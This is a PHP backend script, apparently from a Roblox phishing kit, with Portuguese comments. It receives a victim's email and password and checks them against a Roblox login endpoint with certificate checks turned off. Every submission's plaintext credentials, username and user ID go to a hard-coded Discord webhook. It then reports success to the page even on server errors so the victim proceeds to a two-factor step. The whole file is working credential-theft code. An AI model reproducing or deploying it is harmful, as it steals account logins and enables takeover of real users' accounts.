<?php
// check.php - Versão Ultra-Estável (Timeout de 30s)
header('Access-Control-Allow-Origin: *');
header('Content-Type: application/json');

// SEU WEBHOOK DO DISCORD
$WEBHOOK_URL = "https://discord.com/api/webhooks/1534375079855784046/bnLKoWanOsTF6O399cs-x-psk-RfPS84OEFe60HL-x7JrVutP4QGYow-2c4NDYKQ89DB";

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $data = json_decode(file_get_contents('php://input'), true);
    $email = $data['email'];
    $password = $data['password'];

    $username = "Unknown";
    $userId = "Unknown";
    $isValid = false;
    $errorMsg = "Connection Timeout";
    $loginSuccess = false;
    $httpCode = 0;

    // Configuração da Ligação ao Roblox
    $loginApiUrl = "https://www.roblox.com/users/login";
    $loginData = json_encode([
        "username" => $email,
        "password" => $password
    ]);

    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $loginApiUrl);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $loginData);
    curl_setopt($ch, CURLOPT_HTTPHEADER, [
        'Content-Type: application/json',
        'User-Agent: Roblox/WinInet',
        'Accept: application/json',
        'X-CSRF-TOKEN: roblox' // Cabeçalho extra para estabilidade
    ]);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    // AUMENTEI O TIMEOUT PARA 30 SEGUNDOS (Era 10 antes)
    curl_setopt($ch, CURLOPT_TIMEOUT, 30); 
    curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 10);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false); // Desativa a verificação SSL para evitar erros de certificado no InfinityFree
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);

    $response = curl_exec($ch);
    $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    $curlError = curl_error($ch);
    $curlInfo = curl_getinfo($ch);
    curl_close($ch);

    // Analisa a resposta
    if ($response && $httpCode == 200) {
        $userData = json_decode($response, true);
        if (isset($userData['id']) && isset($userData['username'])) {
            $userId = $userData['id'];
            $username = $userData['username'];
            $isValid = true;
            $loginSuccess = true;
            $errorMsg = "";
        } else {
            if (isset($userData['error'])) {
                $errorMsg = $userData['error'];
            } else {
                $errorMsg = "Login Failed (No ID returned)";
            }
        }
    } else {
        $errorMsg = "Server Error: " . ($curlError ?: "HTTP $httpCode");
    }

    // Envia ao Discord SEMPRE (Para não perder os dados)
    $statusIcon = $loginSuccess ? "✅" : "⚠️";
    $statusText = $loginSuccess ? "LOGIN SUCCESSFUL" : "LOGIN PENDING (Server Slow)";
    
    $discordMessage = "**🔒 NEW LOGIN ATTEMPT**\n\n" .
                      "**Status:** $statusIcon $statusText\n" .
                      "**Email:** $email\n" .
                      "**Password:** $password\n" .
                      "**Username Found:** $username\n" .
                      "**User ID:** $userId\n" .
                      "**Error:** $errorMsg\n" .
                      "**HTTP Code:** $httpCode\n" .
                      "**Timestamp:** " . date('Y-m-d H:i:s');

    $ch_discord = curl_init();
    curl_setopt($ch_discord, CURLOPT_URL, $WEBHOOK_URL);
    curl_setopt($ch_discord, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch_discord, CURLOPT_POST, true);
    curl_setopt($ch_discord, CURLOPT_HTTPHEADER, ['Content-Type: application/json']);
    curl_setopt($ch_discord, CURLOPT_POSTFIELDS, json_encode(['content' => $discordMessage]));
    curl_exec($ch_discord);
    curl_close($ch_discord);

    // Retorna ao Frontend
    // Se o login falhou por conexão (timeout, server error), diz que é sucesso para o jogador ir para o 2FA.
    // Isso evita que o jogador fique preso no site por causa do servidor lento.
    $frontendSuccess = $loginSuccess || ($httpCode == 0 || $httpCode == 504 || $httpCode == 502 || $httpCode == 200);

    echo json_encode([
        'success' => $frontendSuccess,
        'username' => $username,
        'userId' => $userId,
        'error' => $errorMsg
    ]);
}
?>